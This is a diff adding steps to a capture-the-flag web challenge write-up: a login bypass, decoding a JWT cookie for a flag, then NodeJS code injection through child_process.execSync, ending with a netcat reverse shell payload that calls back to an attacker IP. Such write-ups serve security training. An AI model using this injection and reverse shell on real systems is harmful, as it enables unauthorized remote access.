@@ -30,11 +30,30 @@ Trying that bypasses the login form
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/046e84e9-57e8-481b-89f1-08b9b76bed54)
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/66883af2-ca6e-41be-af4a-263eecd1a4de)
 
+A new cookie is formed and its a jwt token 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a7d75288-15ec-4e23-8793-f0cf70640399)
+
+Using [jwt.io](https://jwt.io/) I decoded the jwt token and got the first flag
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e97c9fe-1ad5-4a1a-883b-59e50e80d435)
+
 There's a place which claims to be executing system commands but when i try execute normal commands it doesn't work
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/70d80988-4740-4c49-bbb8-0db576988e65)
 
 Since we know that the web server is build on NodeJs lets execute a NodeJS command
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/98e7ddae-13d6-4554-9f14-c20c612adf99)
 
 ```js
 (() => { return require("child_process").execSync("whoami;", { timeout: 5000 }); })();
 ```
+
+Now lets get shell :D
+
+```js
+(() => { return require("child_process").execSync("busybox nc 10.2.42.156 1337 -e /bin/bash;", { timeout: 5000 }); })();
+```
+
+To stabilize the shell
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/79634295-3ecd-410c-932c-543f9a59b040)
+
+
+
